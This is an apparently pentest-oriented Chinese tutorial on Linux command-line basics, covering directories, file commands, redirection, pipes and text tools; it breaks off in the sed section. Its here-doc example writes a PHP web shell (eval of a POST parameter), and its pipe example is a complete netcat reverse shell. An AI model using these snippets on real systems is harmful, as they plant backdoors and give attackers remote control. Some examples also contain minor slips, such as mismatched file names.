## 认识 Linux 与命令行

Linux 这一术语有时被用来指代一系列开源操作系统，但更准确的做法或许是用该术语来描述一个[内核](https://en.wikipedia.org/wiki/Kernel_(operating_system))，而这些操作系统正是以该内核为基础构建的。Linux内核的主要功能包括管理外围设备、处理与处理器和内存的通信、调度待执行任务、处理中断请求等。

内核、系统工具以及各类软件包共同整合，形成**发行版（distribution，distro）**。所谓发行版，是一套可安装、可自启动，并附带附加软件的完整系统。严格来说，Linux 指的是内核；在日常交流中，人们也常用 Linux 泛指基于该内核的操作系统。它是各类发行版赖以运行的核心。内核负责管理并协调计算机的各类硬件设备，同时提供进程、内存、文件系统等基础能力。单独的内核，就像一台没有车身的发动机。

与基于 Linux 系统的交互方式之一是通过**命令行（command line，CLI）**。命令行是一种基于文本的界面，允许信息查询或代码执行。我们可以通过打开终端开始使用命令行你会获得一个界面：

```bash
┌─[bob@AttackBox]─[~]
└──╼ $
```

这叫做 shell 提示符，不同的Linux发行版有不同的提示样式（也可以自定义提示）。提示符通常包含一下的内容：

- bob@AttackBox：用户名@主机名
- ~：当前工作目录
- $符号或者#符号

Linux 上有几个重要的 shell程序：

- sh：Bourne shell是所有其他shell环境的基础，因为它承担着最重要的任务，比如命令解释或作为脚本语言。
- Bash：也称为Bourne-Again SHell，Bash旨在通过提供更多功能和更好的语法来替代Bourne SHell。Bash 是大多数 Linux发行版的默认登录shell。
- ksh：这是一个叫Korn SHell 的 shell 环境变体，它同样为基础的 sh 和bash 增加了一些功能。例如，ksh 在循环语法处理上比 Bash 更好。
- zsh：Z SHELL 是扩展版的 Bourne SHell，增加了更多改进和功能，也在部分Bash 的基础上构建。

不同的shell环境执行相同的基本任务——运行程序和解释命令，但它们提供了不同的功能，可能更适合各种任务。很多Linux发行版的默认shell是GNU bash shell。

尝试在命令行中输入第一个命令`whoami`：

```bash
┌─[bob@AttackBox]─[~]
└──╼ $whoami
bob
```

该命令输出 当前有效用户名（effective user name），就像在任何网站或者操作系统中一样，登录时你需要提供用户名或其他能证明你身份的材料（身份标识，Identification），该命令的输出结果就是如此。

> [!NOTE]
>
> 在linux中严格区分大小写,如果提示错误,首先检查是否命令输入有错误


## 目录结构

在windwos中，你可以通过打开一个文件管理器窗口(explorer.exe)来浏览磁盘上的文件和文件夹，在 Linux 中，用户登录后默认进入自己的家目录。而任意时刻,在命令行中所在的目录则称为 **当前工作目录（current working directory）**。

### 查看当前工作目录

当前工作目录可以使用 `pwd`（print working directory）命令，来显示：

```bash
$pwd
/home/bob
```

这个目录看起来和windwos上完全不同，当你在windwos中插入一个新的硬盘格式化后为你所用时，你需要为分区指定一个盘符，并使用类似C:\Program Files (x86)\的格式进行目录导航：![两块物理磁盘并进行了相应的格式化和分区](./image/Linux%E5%9F%BA%E7%A1%80%E4%B8%80/image-20261102010844404.webp)
### 家目录

在 Linux 上新建用户账户时，每个用户都会拥有专属目录，这个目录称为**家目录（home directory）**。默认情况下，家目录存放在 `/home/` 目录下。可以直接执行 `cd` 或者 `cd ~` 快速切换到家目录。

```bash
┌─[bob@AttackBox]─[/home]
└──╼ $cd

┌─[bob@AttackBox]─[~]
└──╼ $cd ~
```

### Linux目录结构

Linux 只有**一棵统一的目录树**，起点是根目录 `/`。没有 Windows 那种 C 盘、D 盘盘符。 多块硬盘、U 盘这些不同存储设备，都 “挂” 到这棵树里面的某个文件夹上（这个文件夹叫**挂载点**），从用户视角看，全部都在同一个目录结构里。

![挂载其他的分区](./image/Linux%E5%9F%BA%E7%A1%80%E4%B8%80/image-20261102014424315.webp)

下表是标准 FHS（Linux 文件系统层次标准），它定义 Linux 文件系统目录结构的标准化规范，规定各级目录的命名、存放内容与访问语义：

| 目录   | 用途                                                         |
| ------ | ------------------------------------------------------------ |
| /      | 虚拟目录树的根目录，是整个文件系统的起点，一般不在根下直接存放业务文件 |
| /bin   | 存放普通用户可用的基础二进制可执行命令（GNU 基础工具，系统救援模式也可使用） |
| /boot  | 引导目录，存放系统内核、initramfs、引导器配置等开机启动相关文件 |
| /dev   | 设备目录，Linux 在这里创建设备节点，用来访问硬件             |
| /etc   | 系统全局配置文件目录                                         |
| /home  | 普通用户家目录的默认存放位置，每个用户独立子目录（可选）     |
| /lib   | 库目录，存放系统程序依赖的共享库、内核模块                   |
| /lib64 | 64 位专用库目录，存放 64 位程序的共享库文件（可选）          |
| /media | 媒介挂载目录，U 盘、光盘这类可移动存储设备的自动挂载点       |
| /mnt   | 临时挂载目录，管理员手动挂载磁盘、文件系统时使用             |
| /opt   | 可选目录，用来存放独立的第三方商业软件包                     |
| /proc  | 虚拟进程文件系统，内核动态生成，存放进程、内核运行信息（断电消失） |
| /root  | root 超级管理员的专属家目录（可选，和普通用户的 /home 分开） |
| /run   | 运行时目录，存放开机后产生的临时运行数据：PID、socket 套接字等，重启清空 |
| /sbin  | 系统管理二进制命令，存放 root 管理员使用的系统工具           |
| /srv   | 服务数据目录，本机部署的网络服务（网站、ftp 等）的数据文件   |
| /sys   | 虚拟文件系统，导出硬件、驱动、内核参数信息，用于硬件管理     |
| /tmp   | 临时文件目录，所有用户都可以读写，系统会定期清理里面的文件   |
| /usr   | 次要层次目录（secondary hierarchy），存放用户程序、文档、库、工具等资源 |
| /var   | 可变数据目录，存放运行中持续变化的数据：日志、缓存、队列、数据库等 |

### cd

要更改工作目录，可以使用`cd`（change directory）命令：

```bash
$cd /etc

$pwd
/etc
```

该命令后跟一个绝对路径或者相对路径，命令执行成功将进入该目录中。

#### 绝对路径

绝对路径(也称完整路径) 总是以正斜线（/）作为开始，后跟目录树的分支，比如存放系统中所有账户信息的文件路径表达：

```bash
/etc/passwd
```

> [!NOTE]
>
> 在linux中，文件不必有后缀名，为区分文件和目录，书写路径时常在目录名末尾加 `/` 以便阅读，但这不是区分文件与目录的强制规则

#### 相对路径

相对路径基于当前工作路径。相对路径不以代表根目录的正斜线（/） 开头，例如下面的目录结构：

```txt
/
└── home
    └── bob 			←当前工作目录
        ├── Documents
        └── Music
```

有两个特殊字符可用于相对路径中：  

1. **单点号（.）**：表示当前目录；
2. **双点号（..）**：表示当前目录的父目录。

可以通过下面两种方式进入/home/bob/Documents/ 目录中,后一种方式省略了单点号:

```bash
$cd ./Documents/

$cd Documents/
```

通过下面两种方式进入 /home/ 目录中:

```bash
$cd ./../
$cd ../
```

有趣的地方,你可以通过下面的方式进入/home或者任何你想去的目录:

```bash
$cd ../../../../../../home

$pwd
/home
```

## ls 

要想知道系统中都有哪些文件，可以使用`ls`（list）命令，例如查看当前目录下的文件和目录：

```bash
$ls
Documents  
```

或者指定目录下，你可以在`ls`命令后跟绝对路径或者相对路径,你可以一次指定多个目录：

```bash
$ls /
bin   dev  home        lib    lib64  mnt  proc  run   srv  tmp  var
boot  etc  initrd.img  lib32  media  opt  root  sbin  sys  usr  vmlinuz

$ls ../
bob
```

如果没有安装彩色终端仿真器，可以使用 `ls` 命令的 `-F` 选项来轻松地区分文件和目录。使用-F 选项可以得到如下输出：

```bash
$ls -F /
bin@   dev/  home/        lib@    lib64@  mnt/  proc/  run/   srv/  tmp/  var/
boot/  etc/  initrd.img@  lib32@  media/  opt/  root/  sbin@  sys/  usr/  vmlinuz@ 
```

对比上下的输出，可以看到目录后用跟/ 以明确区分目录和文件，还有一些符号可以参考：

| **符号** | **类型**       | **说明**                                        |
| -------- | -------------- | ----------------------------------------------- |
| /        | **目录**       | 表示这是一个文件夹                              |
| *        | **可执行文件** | 表示该文件具有执行权限                          |
| @        | **软链接**     | 符号链接（Symbolic Link），指向另一个文件或目录 |
| =        | **Socket**     | 套接字，用于进程间通信                          |
| \|       | **管道**       | FIFO（命名管道），用于进程间通信                |

`-R` 是ls命令的另一个选项，称作递归（recursive）选项，可以列出指定目录所包含的子目录中的文件，但是不支持指定层级，一般使用`Tree`命令替代，他有更好的表达样式，并且支持递归层级。

### 隐藏目录/文件

Linux 中，**隐藏文件 / 隐藏目录**的命名规则：文件名以 `.`（点）开头。 默认 `ls` 不会显示它们。 使用 `ls -a` 可以查看全部文件，包含隐藏文件与隐藏目录，如下所示：

```bash
$ls
Documents  

$ls -a
.             .sudo_as_admin_successful 
..             .bash_history  Desktop         
.bashrc        Documents                   .ssh         
    
```

一些常见的隐藏文件夹的作用：

| 名称                      | 作用                                            |
| ------------------------- | ----------------------------------------------- |
| .ssh/                     | SSH 密钥、公钥私钥、known_hosts，远程登录核心   |
| .config                   | 大部分桌面程序的用户配置文件（现代 Linux 主流） |
| bash_history或zsh_history | 终端命令历史                                    |
| .bashrc或.zshrc           | 交互式 shell（打开终端）加载的配置文件          |
| .profile                  | 登录 shell加载的文件                            |

### 文件/目录详情

`ls` 命令的 `-l` 选项会产生长列表格式的输出，提供指定文件或目录下的详细信息： 

```bash
$ls -l
total 12
drwxrwxr-x 1 bob bob 148 Nov  1 02:09 attackbox
```

你可以组合使用多个选项，例如 `ls -lF` 或`ls -l -F` 大部分的命令都支持这种形式。一些发行版预设了 `ll` 作为 `ls -l` 的别名。

在长列表格式输出中，每一行会列出一个文件或目录。以attackbox目录为例：

| 字段         | 含义                                                         |
| :----------- | :----------------------------------------------------------- |
| drwxrwxr-x   | 第一个字符指明文件类型，例如目录（d）、文件（-）、链接文件（l）、字符设备（c）或块设备（b）<br />后跟对于文件/目录的访问权限。 |
| 1            | 文件的硬链接数目。参考随后讨论的关于链接的内容。             |
| bob          | 文件所有者的用户名。                                         |
| bob          | 文件所属用户组的名字。                                       |
| 148          | 以字节数表示的文件大小。                                     |
| Nov  1 02:09 | 上次修改时间和日期。                                         |
| attackbox    | 文件/目录名。                                                |

如果只想查看目录本身的信息，可以使用组合`-d`选项：

```bash
$ls -ld attackbox/
drwxrwxr-x 1 bob bob 148 Nov  1 02:09 attackbox/
```

可以组合使用`-h`选项，让文件大小以人类可读方式呈现：

```bash
$ls -lh attackbox/README.md
-rw-rw-r-- 1 bob bob 41K Nov  1 02:09 attackbox/README.md
```

### 输出排序

`ls`命令的输出，可以通过下面的方式进行排序：

| 参数                 | 排序规则                 | 默认顺序           |
| -------------------- | ------------------------ | ------------------ |
| 默认 | 按文件名排序 | 升序               |
| `-t`                 | 修改时间 mtime           | **新的在前**       |
| `-S`                 | 文件大小                 | **大的在前**       |
| `-X`                 | 按扩展名排序       | 升序               |
| `-r`                 | 反转         | 把上面的排序反过来 |

### 元字符通配符

shell 提供了特殊字符来帮助你快速指定一组文件名。这些特殊字符叫做通配符。 通配符允许你依据字符的组合模式来选择文件名。下表列出这些通配符 以及它们所选择的对象：

| 通配符        | 意义                                                         |
| :------------ | :----------------------------------------------------------- |
| *             | 匹配任意多个字符（包括零个或一个）但不会匹配名字首字符是 . 的文件和目录 |
| ?             | 匹配任意一个字符（不包括零个）                               |
| [characters]  | 匹配任意一个属于 字符集 中的字符                             |
| [!characters] | 匹配任意一个不是 字符集 中的字符                             |
| [[:class:]]   | 匹配任意一个属于指定 字符类 中的字符                         |

**方括号代表单个字符位置并给出了该位置上的多个可能的选择**。你可以将可能的字符逐一列出[a b c]，也可以指定 字符范围，比如字母范围[a–c]，也可以使用字符类，下表列出常见的字符类：

| 字符类    | 意义                   |
| :-------- | :--------------------- |
| [:alnum:] | 匹配任意一个字母或数字 |
| [:alpha:] | 匹配任意一个字母       |
| [:digit:] | 匹配任意一个数字       |
| [:lower:] | 匹配任意一个小写字母   |
| [:upper:] | 匹配任意一个大写字母   |

下面是一些案例，接受文件名作为参数的任何命令，都可以使用通配符：

| 模式                   | 匹配对象                                                  |
| :--------------------- | :-------------------------------------------------------- |
| *                      | 所有文件和文件夹，默认不包括隐藏文件/目录                 |
| g*                     | 文件名以“g”开头的文件                                     |
| b*.txt                 | 以"b"开头，中间有零个或任意多个字符，并以".txt"结尾的文件 |
| Data???                | 以“Data”开头，其后紧接着3个字符的文件                     |
| [abc]*                 | 文件名以"a","b",或"c"开头的文件                           |
| BACKUP.[0-9][0-9][0-9] | 以"BACKUP."开头，并紧接着3个数字的文件                    |
| [[:upper:]]*           | 以大写字母开头的文件                                      |
| [![:digit:]]*          | 不以数字开头的文件                                        |
| *[[:lower:]123]        | 文件名以小写字母结尾，或以 “1”，“2”，或 “3” 结尾的文件    |

## file

## ln

Linux 文件系统引入了**链接（Link）**机制，用来解决 “同一份数据需要在多处被访问” 的场景。链接机制可以基于同一套磁盘物理数据，提供多个访问入口，实现数据共享。链接分为两类：**硬链接（Hard Link）**和**软链接（符号链接，Symbolic Link）**，二者实现原理、特性完全不同。

硬链接本质是文件的别名，多个文件名指向同一个 inode，对应磁盘上同一组数据块。但硬链接不支持跨文件系统，不能对目录创建硬链接，可以使用 `ln` 命令创建硬链接：

```bash
$ln a.txt link_a.txt

$ll
total 0
-rw-rw-r-- 2 bob bob 0 Nov  2 05:38 a.txt
-rw-rw-r-- 2 bob bob 0 Nov  2 05:38 link_a.txt
```

符号链接（也称为软链接）是一个实实在在的文件，该文件指向存放在虚拟目录结构中某个 地方的另一个文件。使用`ln`命令以及`-s`选项来 创建符号链接：

```bash
$ln -s a.txt slink_a.txt

$ll
total 4.0K
-rw-rw-r-- 2 bob bob 0 Nov  2 05:38 a.txt
lrwxrwxrwx 1 bob bob 5 Nov  2 07:21 slink_a.txt -> a.txt
```

软连接类似于 Windows 的“快捷方式”。它是一个拥有独立 inode 的全新文件，它保存的是目标路径字符串（短链接的路径可能直接保存在 inode 内）。如果这个路径无法再找到目标，链接就会成为空链接。

## head、tail

`head` 命令可用于打印文件的前 N 行。例如，若只想显示文件的前三行，可执行 `head -n 3 file.txt` 命令。在查看配置文件时，若我们只关注文件开头的几行，就可以使用该命令。

`tail` 则正好相反。它会输出文件的最后 N 行。我们经常用 tail 来查看日志文件。其语法与 head 类似，如 `tail -n 3 file.txt`,表示显示文件的最后三行。由于日志文件中最新的事件会写在末尾，tail 能让我们快速了解文件的运行情况。`-f` 选项可以跟踪文件追加内容，文件被删除 / 改名会停止。

## cp

`cp`（copy） 命令可以将文件和目录从文件系统的一个位置复制到另一个位置，最基本的用法需要两个参数，默认情况下，该命令不会主动保留权限、时间、属主属组。当要复制一个文件时，例如：

```bash
$cp a.txt /home/bob/b.txt
```

> [!NOTE]
>
> 同名文件默认会被覆盖，使用-i 选项进行交互式提示。如果目标文件已存在，覆盖前会询问用户是否确认（防止误覆盖）。

当需要复制多个文件到一个目录中时，可以像这样列出，也可是使用通配符，目标目录放命令最后，但该目录必须存在：

```bash
$cp a.txt b.txt ./Documents/
```

当需要递归复制整个目录内的文件和子目录（包括隐藏文件和目录）时，可以使用 `-R` 或者`-r`选项。如果NewDocuments/ 目录不存在,类似复制并修改文件夹名字,例如:

```bash
$cp -R Documents/ newDocuments/
$ls newDocuments/
a.txt  b.txt
```

如果目标目录已经存在,那么Documents/将作为子目录，例如:

```bash
$cp -r Documents/ newDocuments/
$ls newDocuments/
Documents
```

`-u` 选项用于增量更新复制，只有当源文件比目标文件 新，或者目标文件不存在时，才执行复制，`-p` 选项尝试保留源文件的原有属性（包括所有者、权限、时间戳等），但能否完整保留取决于当前用户权限和文件系统。

## mv

`mv`（move） 命令可以将文件和目录移动到另一个位置 或是重新命名：

```bash
$mv dir1/ dir2/
$ls dir2
dir1

```

当源和目标都是目录，且目标目录存在时，源作为目标的子目录；当目标目录不存在时，mv命令的作用为重命名目录。

可以有多个源文件 源目录，最后一个参数为必须存在的目录，例如

```bash
$mv a b c /dir2/
```

> [!NOTE]
>
> mv命令默认覆盖，使用`-i` 选项可以避免此问题

如果不想作为子目录移动，可以使用通配符，第一个参数匹配普通文件/目录，第二个参数匹配以单个点后接非点字符开头的隐藏名称；**它无法覆盖所有合法的隐藏文件名**：

```bash
$mv dir1/* dir1/.[^.]* dir2/
```

> [!NOTE]
>
> 在 Linux 的 Bash 终端中，通配符 * 默认不包含以 . 开头的隐藏文件（如 .env、.gitignore、.ssh 目录等）

或者临时开启 Bash 的 dotglob 选项可以临时让 * 包含隐藏文件：

```bash
$shopt -s dotglob    # 开启：让 * 匹配隐藏文件

$mv dir1/* dir2/

$shopt -u dotglob    # 关闭（可选）：恢复默认行为
```

# 管道与重定向

本章节涵盖以下学习目标：

1. 理解 Linux 三大标准数据流（STDIN、STDOUT、STDERR）及其文件描述符
2. 熟练使用输出重定向（>、>>）与输入重定向（<、<<）管理数据流
3. 掌握错误重定向与流合并（2>&1、&>）技巧
4. 熟练运用管道符（|）串联多个命令构建处理管线
5. 了解命名管道（FIFO）的基本概念与进程间通信方式

在介绍其他命令之前，先学习管道和重定向，这些功能使我们能够组合更多命令。每个在基于 Linux 系统的命令行上运行的程序都会自动关联三个数据流。每个数据流还会被分配一个文件描述符整数值：

- 标准输入 (0,STDIN)：用于向程序提供输入，默认来自键盘。 
- 标准输出 (1,STDOUT)：程序正常执行结果的输出，默认输出到终端。 
- 标准错误 (2,STDERR)：程序错误信息的输出，默认输出到终端。

管道和重定向是引导标准数据流的方式，可以在程序、文件之间转接流；管道可以将前一个程序的标准输出，作为下一个程序的标准输入。

## STDIN、STDERR

假设需要将 cat 命令的结果输出到文件中,而不是直接显示到命令行,可以按照如下的示例:

```bash
$cat /etc/passwd > pwd.txt
```

命令执行后,将看不到任何的输出结果,重定向 **>** 符号将cat命令的标准输出,重定向到一个文件中,通过打开该文件可以验证:

```bash
$cat pwd.txt
root:x:0:0:root:/root:/bin/bash
<省略>
```

如果尝试读取一个不存在的文件,cat命令会报告错误，如果需要将错误信息重定向到文件中，可以将该文件描述符索引值（2）放在重定向符号之前，只重定向错误消息：

```bash
$cat noexist 2> pwd.txt

$cat psd.txt
cat: noexist: No such file or directory
```

但pwd.txt 文件之前保存的内容被清空了，取而代之的只有cat命令的错误信息，这是因为重定向时，目标文件总是从开头被重写，如果需要从文件后面附加，需要使用 **>>** 符号，表示从文件内容末尾开始。

如果需要同时将 标准输入 (0），标准错误 (2）都进行重定向，下面的例子将两个不同的输出重定向到不同文件,并且不覆盖原文件的内容，可以用如下的示例：

```bash
$cat /etc/passwd noexist >> psd.txt 2>> error.txt

$head -n1 psd.txt  error.txt
==> psd.txt <==
root:x:0:0:root:/root:/bin/bash

==> error.txt <==
cat: noexist: No such file or directory
```

如果需要将两者重定向到同一个文件，可以使用 两种方法：

```bash
$cat /etc/passwd noexist > log.txt 2>&1
```

，如果学过编程语言的指针，该命令可以这样理解：

1.  **> log.txt**：cat 命令的标准输出 (1,STDOUT) 指向 log.txt
2.  **2>&1**：复制 当前标准输出 (1,STDOUT) 的指向，并修改 标准错误 (2,STDERR)  的指向

bash还提供了上面命令更加精简的写法：

```bash
$cat /etc/passwd noexist >& log.txt 
```

弄清楚这里的指向关系后，下面的命令是否能理解呢？为什么没有重定向到文件中？

```
$cat /etc/passwd noexist 2>&1 log.txt
```

## STDIN

在使用输入重定向符 **<** 时，Linux会用重定向指定的文件替换标准输入文件描述符。命令就会从文件中读取数据，就好像这些数据是从键盘输入的一样。

> [!NOTE]
>
> 并非所有的命令都支持 从 标准输入中获取参数并执行

一个最常见的例子来自 `cat` 命令，当在命令行中只输入cat命令时，它会从STDIN接收输入。输入一行，cat命令就显示 一行：

```bash
$cat
hello
hello
```

结束输入，按下 Ctrl+D 键，就是向程序发送 **EOF（文件结束标记）**，cat 收到后结束读取、退出。

cat 除了文件名参数，让我们试着重定向标准输入：

```
$cat < redirect.txt
drwxrwxr-x 1 bob bob 0 Nov  2 07:28 dir1
```

### here-doc

**<<** 符号可将多行文本块作为输入传递给命令，直到遇到用户定义的结束符（如 **EOF**）为止，常用于自动化执行需要交互的命令：

```bash
$cat << EOF > sh.php
> <?php
>   @eval($_POST['cmd']);
> ?>
> EOF
```

结束符可以任意，但常用EOF 表示结束，当输入EOF时，将输入的数据作为**标准输入（fd0）**传给cat的命令，之后使用输出重定向到目标文件中。

### Here-String

<<< 符号 将一个**单行字符串**直接作为标准输入传递给命令，比如base64命令（用于Base64编解码）或md5sum （用于计算MD5哈希值），它们不支持直接在参数中传递字符串编码值，但支持从读取标准输入读取，所以可以使用嵌入字符串 传递：

```bash
$base64 -d <<< "cGFzc3dvcmQ="
$md5sum <<< "admin888"
```

## 管道

管道（|）被置于命令之间，用于将一个命令的输出传入另一 个命令中，例如使用 sort 命令对ls命令的输出排序：

```bash
$ls | sort -r
dir3
dir2
dir1
```

shell创建了两个进程来分别执行ls和sort。两个进程都连接到了管道上，这样写入进程（ls）就将其标准输出（文件描述符为1）连接到了管道的写入端，读取进程（sort）就将其标准输入（文件描述符为0）连接到管道的读取端。实际上，这两个进程并不知道管道的存在，它们只是从标准文件描述符中读取数据和写入数据。

![image-20261104231503572](./image/Linux%E5%9F%BA%E7%A1%80%E4%B8%80/image-20261104231503572.webp)

当使用管道连接不同的命令时,命令不是逐个运行，所有的命令都在执行，只是当从一个当前为空的管道中读取数据将会被阻塞运行，直到至少有一个字节被写入到管道中为止。如果管道的写入端被关闭了，那么从管道中读取数据的进程在读完管道中剩余的所有数据之后将会看到文件结束。

管道可以串联的命令数量没有限制。可以持续地将命令输出通过管道传给其他命令，例如：

```bash
$rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.100 4444 > /tmp/f
```

这是一个复杂的命令，还包括一些没有介绍的内容，不过很好理解，分号;用于在一行中连续的执行命令，nc工具用于网络连接。下面介绍mkfifo命令

### fifo

FIFO与管道类似，它们两者之间最大的差别在于FIFO在文件系统中拥有一个名称，并且其打开方式与打开一个普通文件是一样的。FIFO也有一个写入端和读取端，数据按写入顺序读出，First In First Out，先入先出。FIFO有时候也被称为命名管道。

`mkfifo` 命令可以在文件系统上创建 FIFO（命名管道）特殊文件，并使用`-m` 选项 指定权限：

```bash
$mkfifo f

$ls -Fl
total 0
prw-rw-r-- 1 bob bob 0 Nov  4 10:46 f|
```

一旦FIFO被创建，任何进程都能够打开它，打开一个FIFO以便读取数据将会阻塞直到另一个进程打开FIFO以写入数据为止。相应地，打开一个FIFO以写入数据将会阻塞直到另一个进程打开FIFO以读取数据为止。

## vim

vim编辑器在内存缓冲区中处理数据。只要输入vim 命令和要编辑的文件名就可以启动vim编辑器。在启动vim时没有指定文件名，或者指定文件不存在，则vim会开辟一段新的缓冲区进行 编辑。如果指定存在的文件，则vim会将该文件的整个内容都读入缓冲区以备编辑。如下中打开sshd服务端配置文件/etc/ssh/sshd_config：

```
vim /etc/ssh/sshd_config
```

vim 编辑器会检测会话的终端类型，使用全屏模式来将整个控制台窗口作为 编辑器区域。vim编辑器有3种操作模式：

1. 命令模式（Normal 模式 / 普通模式）：打开 vim 默认进入这个模式。 不能直接打字输入内容；可以执行光标移动、复制、删除、撤销、跳转等命令。
2. 插入模式（Insert 模式）：可以直接敲键盘输入文本、编辑内容。
3. Ex 模式（命令行模式）：在界面底部出现冒号 : ，输入命令执行保存、退出、查找替换、设置参数等。

按下 i 键就可以进入插入模式,这时可以编辑你的文件。要退出插入模式,按下Esc键即可返回命令模式。 要进入Ex模式，在命令模式中按下冒号键（:）即可。光 标会移动到屏幕底部的消息行处，然后出现冒号，等待输入命令。

## sort

`sort` 命令会依据会话所指定的默认语言的排序规则来对每行数据 进行排序，默认 ASCII 字典序、升序，不修改原文件，排序结果输出到 stdout，常配合管道使用，例如：

```bash
$cat <<EOF | sort
> 10
> 2
> aa
> b
> ab
> EOF
10
2
aa
ab
b

```

在对数字进行排序时，为避免和上面命令输出一样，升序的情况下 10>2。需要使用 `-n` 选项，例如：

```bash
 $cat <<EOF | sort -n
> 10
> 2
> a
> a1
> a2
> EOF
a
a1
a2
2
10
```

如果需要对按字段分隔的数据，根据不同的字段进行排序，先使用`-t` 选项指定字段分隔符，然后使用`-k` 选项指定第几个字段。

例如下面的命令，每一行数据使用冒号（：）进行分割，所以指定 -t ‘:' ,然后`-k 3`按照第3个字段来排序：

```bash
$ sort -t ':' -k 3 -n /etc/passwd
root:x:0:0:root:/root:/bin/bash 
bin:x:1:1:bin:/bin:/sbin/nologin 
```

`sort`命令还可以在排序之后进行去重，只需要指定 `-u` 选项，如下所示：

```bash
 $cat <<EOF | sort -u
> a
> b
> a
> EOF
a
b
```

还有一些常用的命令选项：

| 短选项 | 描述                                                         |
| ------ | ------------------------------------------------------------ |
| -r     | 反转，降序。常和 -n 组合                                     |
| -f     | 忽略大小写排序                                               |
| -o     | 输出到文件                                                   |
| -s     | 稳定排序：如果两行排序 key 相同，保留原始先后顺序。多字段排序很有用 |
| -b     | 忽略行开头空格                                               |
| -m     | 合并已经排好序的文件，不会重新全量排序                       |

## uniq

uniq命令经常和 sort 命令结合在一起使用。uniq 从标准输入或单个文件名参数接受数据有序 列表，默认情况下，从数据列表中删除**相邻的**重复行，例如如下的示例：

```bash
$cat <<EOF | sort | uniq
> a
> c
> a
> d
> EOF
a
c
d
```

一些常用的选项如下表所示：

| 短选项 | 描述                                         |
| ------ | -------------------------------------------- |
| `-c`   | 在每行前面输出重复次数                       |
| `-d`   | 只输出有重复的行（只打印重复项）             |
| `-D`   | 输出全部重复的行（重复行全部打印，不止一条） |
| `-u`   | 只输出**只出现一次**的行                     |
| `-i`   | 忽略大小写比较                               |
| `-w N` | 只比较前 N 个字符                            |
| `-s N` | 跳过前面 N 个字符再对比                      |

## wc

`wc`（word count）命令是用来显示文件所包含的行数、字数和字节数。例如：

```
$wc /etc/passwd
  50   83 2837 /etc/passwd
```

wc 打印出来三个数字，依次为行数，单词数和字节数。如果只想知道行数，可以使用 `-l` 选项

## cut

`cut`命令用来从文本中抽取字段，它接受 多个文件参数 或者 标准输入作为源，例如：

```
$cut -d':' -f1,3 /etc/passwd
root:0
```

-d 选项用于指定分隔符，-f 选项用于表示要选取第1列和第3列。也可以选取第1~3列，或者从某列开始到结束：

```bash
# 第1、3列
cut -d' ' -f1,3 /etc/passwd
# 1～3 列
cut -d' ' -f1-3 /etc/passwd
# 从第2列到末尾
cut -d' ' -f2- /etc/passwd
```

常用的选项如下：

| 短选项       | 说明                             |
| ------------ | -------------------------------- |
| -d           | 指定分隔符（默认是 TAB）         |
| -f           | 选取哪些字段（列）               |
| -c           | 按字符位置截取                   |
| -b           | 按字节截取                       |
| --complement | 取反：除了你选的字段，其他都输出 |
| -s           | 只输出包含分隔符的行             |

## tr

`tr` 命令用于字符转换、删除、压缩重复字符，只操作单个字符不按行 / 字段匹配；读取标准输入，不直接接文件名，常配合管道使用。命令接受两个参数：要被转换的字符集以及 相对应的转换后的字符集。字符集可以用三种方式来表示：

1. 一个枚举列表。例如， ABCDEFGHIJKLMNOPQRSTUVWXYZ
2. 一个字符域。例如，A-Z ，1-9。
3. POSIX 字符类。例如，[:upper:]

大多数情况下，两个字符集应该长度相同。常见的用法例如大小写转换：

```bash
# 小写 → 大写
$echo "root Admin Test" | tr 'a-z' 'A-Z'

# 大写 → 小写
$echo "ROOT ADMIN" | tr 'A-Z' 'a-z'
```

`echo`命令 接收字符串参数，把内容打印到标准输出（stdout）；它本身不读取文件，只处理你传给它的参数。

可以利用 `tr`命令简单的实现凯撒密码 （ROT13）加解密，如下所示：

```bash
# 加密
$echo "hello WORLD" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
uryyb JBEYQ

# 解密
$echo "uryyb JBEYQ" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
hello WORLD
```

压缩连续重复字符：

```bash
$echo "1.1.1.1   root" | tr -s ' '
1.1.1.1 root
```

删掉指定的字符：

```
$echo "user:x:1000:1000" | tr -d ':'
userx10001000
```

只保留指定字符:

```bash
$echo "from 1.2.3.4 abc" | tr -cd '0-9.'
1.2.3.4
```

常见的选项如下所示：

| 短选项 | 作用                             |
| ------ | -------------------------------- |
| -c     | 取反：对不在第一集合里的字符操作 |
| -d     | 删除指定字符（最常用之一）       |
| -s     | 压缩连续重复字符为单个           |

## grep

 grep 会在文本文件中搜索指定的正则表达式，并将所有包含匹配项的行输出到标准输出（通常是终端屏幕）。了解一点正则表达式（regex）的工作原理会很有帮助。正则表达式是一种用于描述搜索模式的特殊文本字符串。网上有许多优质资源可以详细讲解[正则表达式](http://www.rexegg.com/)。

例如在etc/passwd中检索关于root账户的信息：

```bash
$grep 'root' /etc/passwd
root:x:0:0:root:/root:/bin/bash
nm-openvpn:x:112:113:NetworkManager OpenVPN:/var/lib/openvpn/chroot:/usr/sbin/nologin
```

因为有多个行 匹配到root，所以他输出了所有的匹配到的行，如果只匹配以root 起始的行，可以配合使用正则表达式，如下面的示例：

```bash
$grep -E '^root' /etc/passwd
root:x:0:0:root:/root:/bin/bash
```

还有一些常见的选项：

| 短选项 | 作用                             |
| ------ | -------------------------------- |
| -i     | 忽略大小写                       |
| -r     | 递归搜索目录下所有文件           |
| -n     | 输出时带上行号                   |
| -v     | 反向匹配：输出不包含该模式的行   |
| -o     | 只打印匹配到的文本，而不是整行   |
| -E     | 使用扩展正则，不用转义 `()+      |
| -F     | 把搜索内容当成纯文本，不解析正则 |
| -c     | 只输出匹配行数，不输出内容       |
| -A N   | 匹配行之后，再多输出 N 行        |
| -B N   | 匹配行之前，再多输出 N 行        |
| -C N   | 前后各输出 N 行（上下文）        |
| -q     | 静默，只返回退出码，脚本判断用   |

## sed

sed 编辑器被称作流编辑器（stream editor），在交互 式文本编辑器（比如Vim）中，可以用键盘命令交互式地插入、删除或替换文本数据。流编辑器 则是根据事先设计好的一组规则编辑数据流。他的执行过程如下：

1. 从输入中读取一行数据。
2. 根据规则匹配（修改）数据。  
3. 将新的数据输出到STDOUT。

在流编辑器匹配并针对一行数据执行所有规则之后，会读取下一行数据并重复这个过程。在 流编辑器处理完数据流中的所有行后，就结束运行。

看一个下面的简单文本替换的例子：

```bash
# 把 root 替换成 admin，每行只换第一个
$echo "root root" | sed 's/root/admin/'

# 全局替换（g）
$echo "root root" | sed 's/root/admin/g'

# 忽略大小写
